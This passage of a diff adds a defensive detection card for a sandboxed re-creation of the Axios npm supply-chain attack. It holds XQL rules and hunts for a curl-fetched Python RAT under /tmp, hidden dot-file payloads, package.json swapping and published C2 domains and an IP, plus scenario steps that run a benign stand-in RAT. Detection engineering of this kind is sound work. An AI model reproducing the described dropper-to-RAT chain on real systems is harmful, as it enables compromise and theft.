+        "description": "A script interpreter is the direct parent of a binary that runs from a hidden six-character dot-file under /tmp. Published: the RAT's peinject command drops and executes binary payloads. Linked source: on Linux the drop path is a hidden file under /tmp with a random six-character name. Matches the mirrored path in SIM-KOI-012 step-06 as well. Operator-installed and NOT declared by SIM-KOI-012 (the lab tenant lists 0 custom BIOC rules, so the scenario expects nothing from it). To use it, create a BIOC rule in the tenant from the XQL below at severity Medium; CortexSim never writes it. Untested in any tenant.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter actor_process_image_name ~= \"^(python[0-9.]*|node|perl|ruby)$\"\n| filter action_process_image_path ~= \"/tmp/[.][A-Za-z0-9]{6}$\"",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1105",
+          "T1564.001"
+        ]
+      },
+      {
+        "name": "KOI-012 File Renamed Over Package Json Inside Node Modules",
+        "description": "A file is renamed onto package.json inside an installed package directory. Published: after launching the payload the dropper replaces the tampered package.json with the clean decoy package.md. Linked source: the swap is a rename. npm writes manifests when it unpacks a package; a rename onto one afterwards is the anti-forensic step. FILE_RENAME has not been observed in this lab, so SIM-KOI-012 validates the swap by the mv process start instead. Operator-installed and NOT declared by SIM-KOI-012 (the lab tenant lists 0 custom BIOC rules, so the scenario expects nothing from it). To use it, create a BIOC rule in the tenant from the XQL below at severity Medium; CortexSim never writes it. Untested in any tenant.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_RENAME\n| filter action_file_path ~= \"node_modules/(@[^/]+/)?[^/]+/package[.]json$\"",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1070.004",
+          "T1036"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "KOI-012 Plain Crypto JS Tree Written And Setup JS Strings Decoded",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_DIR_CREATE, ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE) and action_file_path contains \"/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js\")\n   or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_command_line contains \"/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js/setup.js\")\n| fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "KOI-012 First Stage Fetch And RAT Script Written At Mirrored Tmp Ld Py",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE, ENUM.FILE_RENAME) and action_file_path = \"/var/tmp/.cortexsim-axios/tmp/ld.py\")\n   or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_name = \"curl\" and action_process_image_command_line contains \"packages.npm.org/product2\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-axios/tmp/ld.py\")\n| fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "KOI-012 Python RAT Launched With C2 URL Argument",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"/var/tmp/.cortexsim-axios/tmp/ld.py\" and action_process_image_command_line contains \":8000/6202033\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "KOI-012 Decoy Manifest Renamed Over Package Json",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"mv\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js/package.md\"\n| fields _time, agent_hostname, actor_causality_id, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "KOI-012 RAT Runscript Spawns Shell Child",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_command_line contains \"/var/tmp/.cortexsim-axios/tmp/ld.py\" and action_process_image_command_line contains \"uname -a\"\n| fields _time, agent_hostname, actor_causality_id, actor_process_command_line, action_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "KOI-012 RAT Peinject Runs Hidden Dot File",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_path ~= \"^/var/tmp/[.]cortexsim-axios/tmp/[.][A-Za-z0-9]{6}$\"\n| fields _time, agent_hostname, actor_causality_id, actor_process_command_line, action_process_image_path, action_process_image_sha256",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "Unit 42 Axios Hunt 1 — C2 On Command Line (as published)",
+        "query": "// Title: Compromised Axios npm package version (1.14.1 and 0.30.4) C2 on Command Line\n// Description: First stage of activity once a compromised endpoint runs the affected axios package is for the dropper scripts to call out to their C2 domain sfrclak[.]com\n// MITRE ATT&CK TTP ID: T1105\nconfig case_sensitive = false\n| dataset = xdr_data\n| fields _time, event_type, event_sub_type, event_id, agent_hostname, agent_id, action_process_image_command_line, actor_process_command_line\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_command_line ~= \"(?:\\bsfrclak\\.com\\b)\"\n| comp values(action_process_image_command_line) as action_process_image_command_line, values(actor_process_command_line) as actor_process_command_line by _time, agent_hostname, agent_id",
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "Unit 42 Axios Hunt 2 — Malicious plain-crypto-js Package Directory (as published)",
+        "query": "// Title: Compromised Axios npm package version (1.14.1 and 0.30.4) Malicious plain-crypto-js package directory\n// Description: The malicious package is actually plain-crypto-js, this looks for directory creation events for that package name within a node_modules folder\n// MITRE ATT&CK TTP ID: T1204.005\nconfig case_sensitive = false\n| dataset = xdr_data\n| fields _time, event_type, event_sub_type, event_id, agent_hostname, agent_id, action_file_path, actor_process_command_line\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_DIR_CREATE, ENUM.FILE_DIR_WRITE, ENUM.FILE_DIR_RENAME) and lowercase(action_file_path) ~= \"(?:\\bnode_modules[\\\\\\/]plain-crypto-js\\b)\"\n| comp values(action_file_path) as action_file_path, values(actor_process_command_line) as actor_process_command_line by _time, agent_hostname, agent_id",
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "Unit 42 Axios Hunt 3 — File Indicators (adapted: ENUM prefix added)",
+        "query": "// Title: Compromised Axios npm package version (1.14.1 and 0.30.4) File Indicators\n// Description: Upon installation of the compromised axios package via npm, the postinstall script deploys dropper scripts to download and install a remote access trojan on Mac, Linux, or Windows endpoints.\n// MITRE ATT&CK TTP ID: T1105 & T1219\n// Adapted from Unit 42: the ENUM. prefix was added to the three event_sub_type values. Nothing else was changed.\nconfig case_sensitive = false\n| dataset = xdr_data\n| fields _time, event_type, event_sub_type, event_id, agent_hostname, agent_id, action_file_path, actor_process_command_line\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE, ENUM.FILE_RENAME) and lowercase(action_file_path) ~= \"(?:library\\/caches\\/com\\.apple\\.act\\.mond|\\/tmp\\/ld\\.py|c:\\\\programdata\\\\wt\\.exe|appdata\\\\local\\\\temp\\\\6202033\\.(?:ps1|vbs)|c:\\\\programdata\\\\system\\.bat)\"\n| comp values(action_file_path) as action_file_path, values(actor_process_command_line) as actor_process_command_line by _time, agent_hostname, agent_id",
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "KOI-012 Node Spawns Shell With Curl And Nohup Python (linked source ancestry)",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 604800\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"node\"\n| filter action_process_image_command_line contains \"curl\" and action_process_image_command_line contains \"/tmp/ld.py\" and action_process_image_command_line contains \"nohup\"\n| fields _time, agent_hostname, agent_id, actor_causality_id, actor_process_command_line, action_process_image_command_line",
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "KOI-012 Endpoint Connection To Published Axios C2 Infrastructure",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 604800\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = \"142.11.206.73\" or action_external_hostname in (\"sfrclak.com\", \"callnrwise.com\") or dst_action_external_hostname in (\"sfrclak.com\", \"callnrwise.com\")\n| fields _time, agent_hostname, agent_id, actor_causality_id, actor_process_image_name, actor_process_command_line, action_external_hostname, dst_action_external_hostname, action_remote_ip, action_remote_port",
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "KOI-012 Axios Postinstall Dropper To Python RAT Payload Execution",
+        "rule_id": "CR-KOI-0012",
+        "logic": "Operator-installed correlation rule (CortexSim never writes it). Alert name EXACTLY as this rule's name; severity Medium; Scheduled, every 10 minutes, query time frame 1 hour; alert field mapping: agent_hostname -> Host Name, agent_id -> Agent ID (the mapped artifacts are what let a correlation issue join a case); MITRE tag T1219 only, so the issue is not credited to another step's row by technique. UNTESTED: this XQL has not been run in any tenant. Its shape follows CR-EDR-0023, which was tested read-only in the lab tenant on 2026-11-11. It is built only from events SIM-KOI-012 produces on one host, and every leg also matches the unmirrored path the real threat uses (/tmp/ld.py and a hidden six-character file under /tmp). It fires when the RAT runs a hidden dot-file AND at least two of the other three legs are present, so one missing file sub-type does not silence it. While the events stay inside the one-hour time frame it fires again on every scheduled run. XQL:\ndataset = xdr_data\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| alter leg = if(event_type = ENUM.FILE and action_file_path ~= \"node_modules/plain-crypto-js\", \"package\", if(event_type = ENUM.FILE and action_file_path ~= \"/tmp/ld[.]py$\", \"rat_dropped\", if(event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_command_line ~= \"/tmp/ld[.]py +https?://\", \"rat_launched\", if(event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and actor_process_command_line ~= \"/tmp/ld[.]py\" and action_process_image_path ~= \"/tmp/[.][A-Za-z0-9]{6}$\", \"payload_executed\", \"other\"))))\n| filter leg in (\"package\", \"rat_dropped\", \"rat_launched\", \"payload_executed\")\n| alter payload = if(leg = \"payload_executed\", 1, 0)\n| comp count_distinct(leg) as legs, max(payload) as payload_executed, count() as events, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, agent_id\n| filter legs >= 3 and payload_executed = 1"
+      }
+    ],
+    "prevention_modules": [
+      {
+        "name": "Local Analysis Malware",
+        "detection_id": "prevention-local-analysis-malware",
+        "module": "local_analysis",
+        "platforms": [
+          "linux"
+        ],
+        "alert_name_pattern": "Local Analysis Malware*",
+        "description": "The agent's Local Analysis verdict when the WildFire test ELF is executed. Observed in this lab on 2026-11-11: HIGH, detection method TRAPS, action REPORTED under a report-mode policy; it opened a case and SimCore reconcile matched it. In SIM-KOI-012 the same file is executed by the RAT's peinject verb: python3 writes it to a hidden dot-file and starts it. That variant (python3 as the parent, a dot-file name) has not been observed yet. Issues named Local Analysis are deduplicated for one hour per file, so do not run this within an hour of another execution of the test ELF on the host. Do not key on the ELF's hash: two downloads seconds apart on 2026-11-11 returned two different SHA256 values, so whether the dedup carries from one run to the next is unverified and the spacing rule is kept. Declared with outcome: detect. This is the scenario's only built-in Medium-or-higher issue. No verdict is declared on ld.py itself: Unit 42 reports out-of-the-box prevention of the second stage for Windows and macOS only, and the lab RAT is a benign stand-in.",
+        "severity": "high",
+        "mitre_techniques": [
+          "T1204.002"
+        ]
+      }
+    ],
+    "analytics_modules": [
+      "Not declared (built-in XDR Analytics BIOC, Low, never joins a case): 'UNIX LOLBIN process connected to a rare external host'. Observed once in this lab on curl to the WildFire URL. It is rarity-based, this host has reached that URL several times since, and the .invalid canary never connects.",
+      "Not declared (built-in XDR Analytics BIOC, Low): 'Uncommon Linux shell command execution'. Rarity-based; the lab read-back does not say which command line raised it, so no step here is claimed to produce its trigger.",
+      "Not declared ('WildFire Malware', MEDIUM): observed in this lab only when the same ELF was executed again from a second causality chain. This chain has one causality chain and no scheduler, so it may appear as an extra issue but is not an expectation.",
+      "Reference only (named in a Palo Alto Networks blog the Unit 42 post links): the Linux abnormal-communication analytics 'Process connected to a rare external host' and 'Recurring rare domain access'. The real RAT's 60-second beacon to a new domain is their trigger; the lab beacon targets a .invalid name and never connects.",
+      "Reference only (named in a Palo Alto Networks blog the Unit 42 post links): the Global Analytics supply-chain detectors of the form 'Globally uncommon action from a signed process'. They profile signed vendor applications across the customer base; a lab shell running a staged tree is not that.",
+      "Reference only (Unit 42 protections section): NGFW Threat Prevention signature 87121; Advanced URL Filtering and Advanced DNS Security classify the known IPs and domains as malicious. No firewall is in the lab path.",
+      "Hunt idea, no query here: the Internet Explorer 8 on Windows XP user-agent arriving from a Linux host, and a 60-second HTTP POST cadence to port 8000. Both need HTTP header visibility on a proxy or firewall."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "malware-protection",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "XDR-LOCAL-ANALYSIS"
+        ],
+        "license_required": "pro",
+        "evidence_query": "Issue 'Local Analysis Malware' on the endpoint for the peinject payload, a six-character dot-file under /var/tmp/.cortexsim-axios/tmp (detection method TRAPS)."
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-KOI-0012"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Issue 'KOI-012 Axios Postinstall Dropper To Python RAT Payload Execution' (operator-installed correlation, Medium) on the endpoint, in the same case as the Local Analysis Malware issue."
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "bioc",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "KOI-012 Interpreter Started On Tmp Script With HTTP URL Argument",
+          "KOI-012 Interpreter Runs Hidden Dot File From Tmp",
+          "KOI-012 File Renamed Over Package Json Inside Node Modules"
+        ],
+        "license_required": "pro",
+        "evidence_query": "Operator-installed BIOCs from this card. SIM-KOI-012 declares none of them; if installed at Medium, their issues appear on the endpoint and can join the case."
+      },
+      {
+        "module": "ngfw-pa-series",
+        "submodule": "url-filtering-logs",
+        "coverage_tier": "detection",
+        "evidence_query": "// Title: Compromised Axios npm package version (1.14.1 and 0.30.4) C2 NGFW Traffic\n// Description: First stage of activity once a compromised endpoint runs the affected axios package is for the dropper scripts to call out to their C2 domain sfrclak[.]com\n// MITRE ATT&CK TTP ID: T1105\nconfig case_sensitive = false\n| dataset = panw_ngfw_url_raw\n| filter url_domain ~= \"(?:\\bsfrclak\\.com\\b)\"\n| join type = left (\ndataset = panw_ngfw_traffic_raw\n| fields session_id, source_ip, dest_ip, source_port, dest_port, action_source, bytes_received, bytes_sent, bytes_total, packets_received, packets_sent, packets_total, chunks_received, chunks_sent, chunks_total, session_end_reason\n) as trafficraw trafficraw.session_id = session_id and trafficraw.source_ip = source_ip and trafficraw.dest_ip = dest_ip and trafficraw.source_port = source_port and trafficraw.dest_port = dest_port\n| fields _time, _reporting_device_name, action, action_source, source_ip, source_port, source_user, source_location, dest_ip, dest_port, dest_location, http_method, http_headers, uri, url_category, url_category_list, url_domain, app, app_category, app_sub_category, bytes_received, bytes_sent, bytes_total, packets_received, packets_sent, packets_total, chunks_received, chunks_sent, chunks_total, protocol, inbound_if, outbound_if, from_zone, to_zone, referer, referer_fqdn, referer_port, referer_protocol, referer_url_path, rule_matched, session_id, session_end_reason, severity, sub_type, technology_of_app, tunneled_app, vsys\n| sort desc _time"
+      },
+      {
+        "module": "advanced-threat-prevention",
+        "submodule": "threat-prevention-signature",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "87121"
+        ],
+        "evidence_query": "Named in the Unit 42 protections section: Threat Prevention signature 87121. No firewall is in the lab path, so SIM-KOI-012 does not exercise it."
+      },
+      {
+        "module": "advanced-url-filtering",
+        "submodule": "malicious-url-category",
+        "coverage_tier": "prevention",
+        "evidence_query": "Unit 42 protections section: Advanced URL Filtering classifies the known domains and IP addresses as malicious. Not exercised by SIM-KOI-012."
+      },
+      {
+        "module": "advanced-dns-security",
+        "submodule": "malicious-domain",
+        "coverage_tier": "prevention",
+        "evidence_query": "Unit 42 protections section: Advanced DNS Security classifies the known domains as malicious. Not exercised by SIM-KOI-012."
+      },
+      {
+        "module": "advanced-wildfire",
+        "submodule": "malware-analysis",
+        "coverage_tier": "prevention",
+        "evidence_query": "Unit 42 reports out-of-the-box prevention by Advanced WildFire and BTP for the second stage on Windows and macOS. It makes no such statement for the Linux Python stage, and this card claims none."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-KOI-012",
+        "name": "Axios Supply Chain — Postinstall Dropper to a Linux Python RAT",
+        "description": "Run the Linux second stage of the Axios supply chain attack for real in a sandbox and check three things: the endpoint recorded each stage, the payload the RAT drops and runs draws a Medium-or-higher malware verdict, and an operator-installed correlation ties the stages into one issue.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-KOI-012A",
+            "objective": "The poisoned dependency tree, the first-stage fetch and the RAT launch are recorded on the endpoint.",
+            "preconditions": [
+              "Linux endpoint with the Cortex XDR agent, python3 and curl."
+            ],
+            "steps": [
+              "Stage node_modules/axios and node_modules/plain-crypto-js and decode the dropper string table.",
+              "POST the Linux body to the .invalid canary and write the RAT stand-in at the mirrored /tmp/ld.py.",
+              "Launch it with nohup and the C2 canary URL as its argument."
+            ],
+            "success_criteria": [
+              "XQL `KOI-012 Plain Crypto JS Tree Written And Setup JS Strings Decoded` returns a row.",
+              "XQL `KOI-012 First Stage Fetch And RAT Script Written At Mirrored Tmp Ld Py` returns a row.",
+              "XQL `KOI-012 Python RAT Launched With C2 URL Argument` returns a row.",
+              "These rows are scored by Tier-2 verify only and never raise Detection Accuracy."
+            ],
+            "expected_score_weight": 0.3
+          },
+          {
+            "threat_step_id": "TS-KOI-012B",
+            "objective": "The dropper's anti-forensics and the RAT's rundir and runscript verbs are recorded.",
+            "preconditions": [
+              "TS-KOI-012A ran and the RAT is alive."
+            ],
+            "steps": [
+              "Remove setup.js and rename package.md over package.json.",
+              "Task the RAT with rundir on the decoy home, then runscript."
+            ],
+            "success_criteria": [
+              "XQL `KOI-012 Decoy Manifest Renamed Over Package Json` returns a row.",
+              "XQL `KOI-012 RAT Runscript Spawns Shell Child` returns a row."
+            ],
+            "expected_score_weight": 0.2
+          },
+          {
+            "threat_step_id": "TS-KOI-012C",
+            "objective": "peinject runs the WildFire test ELF, the agent raises a HIGH malware verdict, and the correlation ties the chain into one issue.",
+            "preconditions": [
+              "Outbound HTTPS to wildfire.paloaltonetworks.com.",
+              "CR-KOI-0012 installed at Medium.",
+              "No execution of the WildFire test ELF on the host in the previous hour."
+            ],
+            "steps": [
+              "Fetch the WildFire test ELF and task the RAT with peinject.",
+              "Task the RAT with kill and confirm it exited."
+            ],
+            "success_criteria": [
+              "Issue `Local Analysis Malware` (HIGH) on the endpoint: alert-backed.",
+              "Issue `KOI-012 Axios Postinstall Dropper To Python RAT Payload Execution` (Medium) from CR-KOI-0012: alert-backed, and only if the operator installed the rule.",
+              "XQL `KOI-012 RAT Peinject Runs Hidden Dot File` returns a row (Tier-2 verify only).",
+              "Not a criterion: the Unit 42 hunting queries, the IOC matches, the three BIOCs and every network leg. The scenario declares none of them."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Audit for the compromised releases named by Unit 42: axios 1.14.1 and 0.30.4, and plain-crypto-js 4.2.0 and 4.2.1. Unit 42 names 1.14.0 and 0.30.3 as the safe downgrades.",
+      "Treat any host that installed a compromised release as compromised: rotate the credentials and tokens reachable from it, and check for the per-OS artefacts (/tmp/ld.py on Linux).",
+      "Block egress to the published C2 domain and IP address and review outbound connections on port 8000.",
+      "Pin dependencies with a lockfile and install with lifecycle scripts disabled where the build allows it, so a transitive postinstall hook does not run on install.",
+      "Apply a release cooldown or an internal registry proxy so a version published minutes ago is not installed fleet-wide."
+    ],
+    "detection_engineering": [
+      "Key on behaviour, not on the artefact names alone: an interpreter started on a script under /tmp with an http URL argument, and an interpreter that runs a hidden dot-file under /tmp, both survive a renamed payload.",
+      "node_modules is cleaned after the fact: setup.js is deleted and the manifest is swapped, so a later directory listing shows nothing. Detect at install time (file and process events) and compare the lockfile with the installed manifest.",
+      "The four Unit 42 queries are carried here as published, with one repair: the File Indicators query lacks the ENUM. prefix on its three event_sub_type values in the published text, and the copy on this card adds it. The NGFW query reads panw_ngfw_url_raw joined to panw_ngfw_traffic_raw and is carried as the evidence query of the firewall entry in the product mapping.",
+      "On the lab endpoint FILE_DIR_CREATE and FILE_RENAME have not been observed, so the scenario's validation rows accept a file create or write, or a process start, where Unit 42's queries key on directory and rename sub-types.",
+      "Use actor_causality_id, not a bare causality_id, and timestamp_diff(current_time(), _time, \"SECOND\") for time windows: the lab tenant rejected the other forms.",
+      "Keep operator rules at Medium or higher and map agent_hostname and agent_id in the correlation's alert fields. Low issues never create or join a case, and a correlation issue groups only through mapped artifacts."
+    ]
+  },
+  "references": [
+    {
+      "title": "Threat Brief: Widespread Impact of the Axios Supply Chain Attack",
+      "url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+      "publisher": "Palo Alto Networks Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "published_date": "2026-04-01",
+      "primary": true
+    },
+    {
+      "title": "LINKED SOURCE (linked from the Unit 42 post; Elastic's findings, not Unit 42's) — Elastic Security Labs: Axios, one RAT to rule them all",
+      "url": "https://www.elastic.co/security-labs/axios-one-rat-to-rule-them-all",
+      "publisher": "Elastic Security Labs"
+    },
+    {
+      "title": "LINKED SOURCE, second hop (linked from the Elastic article above, not from Unit 42) — Elastic Security Labs: Axios supply chain compromise detections",
+      "url": "https://www.elastic.co/security-labs/axios-supply-chain-compromise-detections",
+      "publisher": "Elastic Security Labs"
+    },
+    {
+      "title": "LINKED SOURCE (linked from the Unit 42 protections paragraph) — How behavioral analytics stop Linux C2 and credential theft",
+      "url": "https://www.paloaltonetworks.com/blog/security-operations/how-behavioral-analytics-stop-linux-c2-credential-theft/",
+      "publisher": "Palo Alto Networks"
+    },
+    {
+      "title": "LINKED SOURCE (linked from the Unit 42 protections paragraph) — How Cortex XDR Global Analytics protects against supply chain attacks",
+      "url": "https://www.paloaltonetworks.com/blog/security-operations/how-cortex-xdr-global-analytics-protects-against-supply-chain-attacks/",
+      "publisher": "Palo Alto Networks"
+    },
+    {
+      "title": "MITRE ATT&CK — T1195.001 Compromise Software Dependencies and Development Tools",
+      "url": "https://attack.mitre.org/techniques/T1195/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK — T1219 Remote Access Tools",
+      "url": "https://attack.mitre.org/techniques/T1219/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Cortex XSIAM — Create a BIOC rule (XQL on xdr_data, filter and alter stages only)",
+      "url": "https://cortex-docs.paloaltonetworks.com/cortex-xsiam/detect-investigate-and-respond-to-threats/threat-management/detection-rules/what-are-detection-rules/whats-a-bioc/create-a-bioc-rule",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    },
+    {
+      "title": "Cortex XSIAM — Case grouping (Medium-or-higher issues group; shared artifacts and causality chain)",
+      "url": "https://cortex-docs.paloaltonetworks.com/cortex-xsiam/detect-investigate-and-respond-to-threats/investigation-and-response/case-concepts/case-grouping",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    }
+  ]
+}
